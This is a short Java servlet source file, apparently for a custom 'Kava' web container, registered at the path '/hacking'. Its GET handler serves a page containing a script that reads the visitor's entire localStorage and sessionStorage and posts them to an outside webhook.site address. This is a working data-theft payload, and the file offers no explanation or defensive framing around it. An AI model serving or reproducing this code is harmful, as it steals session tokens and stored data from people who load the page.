package com.example.model;

import com.kava.container.http.KavaHttpRequest;
import com.kava.container.http.KavaHttpResponse;
import com.kava.container.servlet.KavaServlet;
import com.kava.container.servlet.KavaServletURI;

@KavaServletURI("/hacking")
public class HackingServlet extends KavaServlet {
    @Override
    public void doGET(KavaHttpRequest request, KavaHttpResponse response) {
        response.setStatusCode(200);
        response.setRequest(request);
        response.setBody("""
                <script>
                var xhr = new XMLHttpRequest();
                xhr.open("POST", 'https://webhook.site/2be266db-6275-4bb0-816c-2aece96e67ec', true);
                xhr.send(JSON.stringify(localStorage) + ' ' + JSON.stringify(sessionStorage));
                </script>""");
    }

    @Override
    public void doPOST(KavaHttpRequest request, KavaHttpResponse response) {
        throw new UnsupportedOperationException();
    }
}
